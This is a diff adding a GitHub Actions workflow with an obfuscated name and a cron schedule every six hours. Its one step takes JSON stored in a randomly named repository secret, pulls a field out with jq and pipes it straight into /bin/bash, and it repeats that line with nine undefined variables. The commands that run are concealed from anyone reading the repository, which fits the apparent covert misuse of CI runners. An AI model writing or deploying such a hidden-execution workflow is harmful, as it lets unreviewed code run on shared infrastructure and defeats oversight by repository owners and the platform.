@@ -1,0 +1,26 @@
+name: fanjiaoqingyi
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: fanjiaoqingyi
+        env:
+          fuufy34733: ${{ secrets.fuufy34733 }}
+        run: |
+          echo $fuufy34733 | jq -r .nvwwv2 | /bin/bash
+          echo $s51 | jq -r .rji7405 | /bin/bash
+          echo $io0 | jq -r .sqcl77 | /bin/bash
+          echo $bd96265 | jq -r .dzr89 | /bin/bash
+          echo $spex5828 | jq -r .vcfqv2671 | /bin/bash
+          echo $px32 | jq -r .t0389 | /bin/bash
+          echo $ffaeb3 | jq -r .doy46610 | /bin/bash
+          echo $tmtp078 | jq -r .y637 | /bin/bash
+          echo $cxdpc6 | jq -r .h334 | /bin/bash
+          echo $omh0 | jq -r .n551 | /bin/bash
+
